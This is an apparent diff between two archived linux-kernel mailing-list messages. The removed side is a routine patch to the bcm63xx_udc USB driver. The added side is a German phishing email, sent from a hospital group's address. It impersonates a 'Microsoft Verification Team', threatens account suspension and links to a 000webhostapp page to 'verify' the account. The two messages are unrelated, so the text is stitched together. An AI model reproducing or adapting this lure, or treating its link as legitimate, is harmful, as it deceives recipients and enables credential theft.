@@ -2,79 +2,88 @@ Return-Path: <linux-kernel-owner@vger.kernel.org>
 X-Original-To: lists+linux-kernel@lfdr.de
 Delivered-To: lists+linux-kernel@lfdr.de
 Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
-	by mail.lfdr.de (Postfix) with ESMTP id 03CCCA7F73
-	for <lists+linux-kernel@lfdr.de>; Wed,  4 Sep 2019 11:33:02 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTP id D0322A7F79
+	for <lists+linux-kernel@lfdr.de>; Wed,  4 Sep 2019 11:34:22 +0200 (CEST)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1729691AbfIDJc5 (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
-        Wed, 4 Sep 2019 05:32:57 -0400
-Received: from szxga07-in.huawei.com ([45.249.212.35]:44976 "EHLO huawei.com"
-        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with ESMTP
-        id S1725840AbfIDJc5 (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-        Wed, 4 Sep 2019 05:32:57 -0400
-Received: from DGGEMS407-HUB.china.huawei.com (unknown [172.30.72.58])
-        by Forcepoint Email with ESMTP id E6614287EB2AD6177276;
-        Wed,  4 Sep 2019 17:32:55 +0800 (CST)
-Received: from localhost (10.133.213.239) by DGGEMS407-HUB.china.huawei.com
- (10.3.19.207) with Microsoft SMTP Server id 14.3.439.0; Wed, 4 Sep 2019
- 17:32:47 +0800
-From:   YueHaibing <yuehaibing@huawei.com>
-To:     <cernekee@gmail.com>, <balbi@kernel.org>,
-        <gregkh@linuxfoundation.org>, <f.fainelli@gmail.com>
-CC:     <bcm-kernel-feedback-list@broadcom.com>,
-        <linux-usb@vger.kernel.org>,
-        <linux-arm-kernel@lists.infradead.org>,
-        <linux-kernel@vger.kernel.org>, YueHaibing <yuehaibing@huawei.com>
-Subject: [PATCH -next] usb: gadget: bcm63xx_udc: use devm_platform_ioremap_resource() to simplify code
-Date:   Wed, 4 Sep 2019 17:32:27 +0800
-Message-ID: <20190904093227.23304-1-yuehaibing@huawei.com>
-X-Mailer: git-send-email 2.10.2.windows.1
+        id S1729696AbfIDJeQ convert rfc822-to-8bit (ORCPT
+        <rfc822;lists+linux-kernel@lfdr.de>); Wed, 4 Sep 2019 05:34:16 -0400
+Received: from exmail.tralee.bonsecours.ie ([213.190.149.3]:63204 "EHLO
+        BSHSSOPHOSVEA.bonsecours.ie" rhost-flags-OK-OK-OK-FAIL)
+        by vger.kernel.org with ESMTP id S1726045AbfIDJeP (ORCPT
+        <rfc822;linux-kernel@vger.kernel.org>);
+        Wed, 4 Sep 2019 05:34:15 -0400
+Received: from BSHSSOPHOSVEA.bonsecours.ie (localhost.localdomain [127.0.0.1])
+        by localhost (Email Security Appliance) with SMTP id 7B788266731_D6F84CAB;
+        Wed,  4 Sep 2019 09:32:58 +0000 (GMT)
+Received: from bscexccashub01.bonsecours.ie (bscexccashub01.bonsecours.ie [10.1.4.106])
+        (using TLSv1 with cipher ECDHE-RSA-AES256-SHA (256/256 bits))
+        (Client CN "webmail.bonsecours.ie", Issuer "COMODO RSA Domain Validation Secure Server CA" (not verified))
+        by BSHSSOPHOSVEA.bonsecours.ie (Sophos Email Appliance) with ESMTPS id 8DD54264BE0_D6F84C6F;
+        Wed,  4 Sep 2019 09:32:54 +0000 (GMT)
+Received: from BSCEXCMAIL01.BONSECOURS.IE ([fe80::9cc5:4b62:bcf9:3590]) by
+ BSCEXCCASHUB01.BONSECOURS.IE ([::1]) with mapi id 14.03.0408.000; Wed, 4 Sep
+ 2019 10:32:50 +0100
+From:   James Forde <jamesforde@bonsecours.ie>
+To:     "NO-REPLY@MICROSOFT.NET" <NO-REPLY@MICROSOFT.NET>
+Subject: Beachten Sie, dass Ihr E-Mail-Konto vor der Sperrung steht
+Thread-Topic: Beachten Sie, dass Ihr E-Mail-Konto vor der Sperrung steht
+Thread-Index: AdVjAzM7MBYlOXgwTe2ejc6KmPe32A==
+Date:   Wed, 4 Sep 2019 09:32:49 +0000
+Message-ID: <F9DF1CD3F70C2A4C9BFBA3CE1A4EA99587EBD10B@BSCEXCMAIL01.BONSECOURS.IE>
+Accept-Language: en-IE, en-US
+Content-Language: en-IE
+X-MS-Has-Attach: 
+X-MS-TNEF-Correlator: 
+x-originating-ip: [196.171.179.88]
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: 8BIT
 MIME-Version: 1.0
-Content-Type: text/plain
-X-Originating-IP: [10.133.213.239]
-X-CFilter-Loop: Reflected
 Sender: linux-kernel-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-Use devm_platform_ioremap_resource() to simplify the code a bit.
-This is detected by coccinelle.
+DRINGENDER HINWEIS ZUR MICROSOFT-ÜBERPRÜFUNG
 
-Reported-by: Hulk Robot <hulkci@huawei.com>
-Signed-off-by: YueHaibing <yuehaibing@huawei.com>
----
- drivers/usb/gadget/udc/bcm63xx_udc.c | 7 ++-----
- 1 file changed, 2 insertions(+), 5 deletions(-)
+Beachten Sie, dass Ihr E-Mail-Konto vor der Sperrung steht, wenn Sie es jetzt nicht ordnungsgemäß bestätigen. Überprüfen<http://bbg58.000webhostapp.com/> Sie dies jetzt, da es sonst ausgesetzt wird.
 
-diff --git a/drivers/usb/gadget/udc/bcm63xx_udc.c b/drivers/usb/gadget/udc/bcm63xx_udc.c
-index 97b1646..7fcf4a8 100644
---- a/drivers/usb/gadget/udc/bcm63xx_udc.c
-+++ b/drivers/usb/gadget/udc/bcm63xx_udc.c
-@@ -2282,7 +2282,6 @@ static int bcm63xx_udc_probe(struct platform_device *pdev)
- 	struct device *dev = &pdev->dev;
- 	struct bcm63xx_usbd_platform_data *pd = dev_get_platdata(dev);
- 	struct bcm63xx_udc *udc;
--	struct resource *res;
- 	int rc = -ENOMEM, i, irq;
- 
- 	udc = devm_kzalloc(dev, sizeof(*udc), GFP_KERNEL);
-@@ -2298,13 +2297,11 @@ static int bcm63xx_udc_probe(struct platform_device *pdev)
- 		return -EINVAL;
- 	}
- 
--	res = platform_get_resource(pdev, IORESOURCE_MEM, 0);
--	udc->usbd_regs = devm_ioremap_resource(dev, res);
-+	udc->usbd_regs = devm_platform_ioremap_resource(pdev, 0);
- 	if (IS_ERR(udc->usbd_regs))
- 		return PTR_ERR(udc->usbd_regs);
- 
--	res = platform_get_resource(pdev, IORESOURCE_MEM, 1);
--	udc->iudma_regs = devm_ioremap_resource(dev, res);
-+	udc->iudma_regs = devm_platform_ioremap_resource(pdev, 1);
- 	if (IS_ERR(udc->iudma_regs))
- 		return PTR_ERR(udc->iudma_regs);
- 
--- 
-2.7.4
+Microsoft Verification Team
 
+
+Microsoft Copyright © 2018 .Inc. Alle Rechte vorbehalten.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Bon Secours Health System Ltd, Registered in Ireland No. 198596.
+Registered Office - College Road, Cork
+
+This e-mail and any files transmitted with it are confidential and
+intended solely for the use of the individual or entity to whom
+they are addressed.
+
+If you have received this e-mail in error please notify the
+originator of the message. This footer also confirms that this
+e-mail message has been scanned for the presence of computer viruses.
+
+Any views expressed in this message are those of the individual
+sender, except where the sender specifies and with authority,
+states them to be the views of Bon Secours Health System Limited .
+
+Please consider the environment before printing this e-mail.
 
